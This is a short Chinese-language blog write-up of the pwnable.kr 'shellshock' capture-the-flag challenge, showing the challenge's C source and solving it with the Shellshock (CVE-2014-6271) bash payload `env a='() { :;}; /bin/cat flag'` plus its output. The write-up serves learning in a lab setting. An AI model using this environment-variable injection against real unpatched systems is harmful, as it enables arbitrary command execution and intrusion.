---
title: 'pwnable.kr #shellshock'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2017-07-27 20:50:01
categories:
	- Writeups
	- pwnable.kr
thumbnailImage: pwnablekr.jpg
keywords:
    - pwnable.kr
    - Toddler's Bottle
    - shellshock
tags:
    - Writeups
---
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)
<!-- more -->

看到題目標題已經有頭緒了，是bash shellshock漏洞的題目，進到題目主機後查看原始碼：
```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

果然是得利用Shellshock來構造payload，Shellshock的payload非常簡單：
```sh
$ env a='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```

Shellshock的細節可以參考 [維基百科](https://goo.gl/vvW9xM)